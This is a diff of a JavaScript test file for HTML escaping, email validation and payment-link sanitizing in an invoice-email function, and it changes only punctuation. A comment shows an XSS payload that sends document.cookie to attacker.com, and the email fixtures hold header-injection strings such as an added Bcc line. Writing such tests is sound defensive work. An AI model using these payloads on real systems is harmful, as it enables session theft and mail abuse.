@@ -8,7 +8,7 @@
   ─────────────────────────────────
   The send-invoice edge function builds a raw HTML email from user-supplied
   fields: vendor name, customer name, notes, line item descriptions.
-  Email clients render HTML — many without a Content Security Policy.
+  Email clients render HTML: many without a Content Security Policy.
   If any field is not escaped, an attacker can:
 
     • <script>fetch("https://attacker.com?c="+document.cookie)</script>
@@ -63,7 +63,7 @@ function sanitizePaymentUrl(url) {
 }
 // ─────────────────────────────────────────────────────────────────────────────
 
-describe("escapeHtml — XSS prevention", () => {
+describe("escapeHtml: XSS prevention", () => {
   it("escapes < (open tag vector)", () => {
     expect(escapeHtml("<script>")).toBe("&lt;script&gt;");
   });
@@ -92,7 +92,7 @@ describe("escapeHtml — XSS prevention", () => {
     expect(out).toContain("&lt;script&gt;");
   });
 
-  it("neutralises img onerror XSS vector — tag becomes inert text", () => {
+  it("neutralises img onerror XSS vector: tag becomes inert text", () => {
     /*
       escapeHtml is a character escaper, not a tag stripper.
       The word "onerror" stays in the output as plain text, but the surrounding
@@ -113,9 +113,9 @@ describe("escapeHtml — XSS prevention", () => {
     expect(out).toContain("&quot;");
   });
 
-  it("neutralises compound / nested injection — all special chars escaped", () => {
+  it("neutralises compound / nested injection: all special chars escaped", () => {
     /*
-      "onclick" is plain ASCII — it stays in the output as text.
+      "onclick" is plain ASCII: it stays in the output as text.
       What matters is that < > & ' " are all escaped, so the browser
       can never interpret this as executable HTML.
     */
@@ -146,7 +146,7 @@ describe("escapeHtml — XSS prevention", () => {
   });
 });
 
-describe("EMAIL_RE — recipient validation", () => {
+describe("EMAIL_RE: recipient validation", () => {
   const VALID = [
     "user@example.com",
     "user+tag@example.com",
@@ -162,8 +162,8 @@ describe("EMAIL_RE — recipient validation", () => {
     "user@",                    // no domain
     "user @example.com",        // space in local part
     "user@exam ple.com",        // space in domain
-    "user\n@example.com",       // newline — SMTP header injection
-    "user\r@example.com",       // carriage return — header injection
+    "user\n@example.com",       // newline: SMTP header injection
+    "user\r@example.com",       // carriage return: header injection
     "user@example.com\nBcc: victim@other.com", // classic header injection
     "user@example",             // no TLD dot
   ];
@@ -177,7 +177,7 @@ describe("EMAIL_RE — recipient validation", () => {
   });
 });
 
-describe("sanitizePaymentUrl — payment link safety", () => {
+describe("sanitizePaymentUrl: payment link safety", () => {
   it("passes through https:// links unchanged", () => {
     const url = "https://buy.stripe.com/test_abc123";
     expect(sanitizePaymentUrl(url)).toBe(url);
